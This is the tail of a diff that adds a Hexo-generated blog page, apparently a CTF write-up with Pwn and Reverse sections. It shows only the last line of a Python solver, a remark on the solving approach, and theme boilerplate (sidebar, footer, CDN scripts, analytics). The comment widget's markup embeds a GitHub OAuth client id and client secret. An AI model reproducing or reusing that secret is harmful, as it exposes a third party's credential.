	<span class="keyword">print</span> chr(i)</span><br></pre></td></tr></table></figure>
+
+<p>这里解的过程可能会有分支，但是只有一条能出flag~后面写了深度搜索脚本再更新。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一、Pwn方向"><span class="toc-number">2.</span> <span class="toc-text">一、Pwn方向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Re"><span class="toc-number">3.</span> <span class="toc-text">二、Re</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
